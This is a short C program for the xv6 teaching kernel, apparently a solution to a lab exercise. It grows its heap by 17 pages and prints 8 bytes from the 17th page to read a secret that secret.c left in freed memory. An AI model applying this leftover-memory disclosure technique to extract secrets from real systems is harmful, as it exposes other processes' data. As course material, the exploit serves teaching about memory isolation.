#include "kernel/types.h"
#include "kernel/fcntl.h"
#include "user/user.h"
#include "kernel/riscv.h"

// 定义页面大小和要申请的页面数量，与 secret.c 保持一致
#define PGSIZE 4096
int
main(int argc, char *argv[])
{
  char *end =sbrk(17*PGSIZE);
  end+=16*PGSIZE;
  write(2,end+32,8);
  exit(1);
}
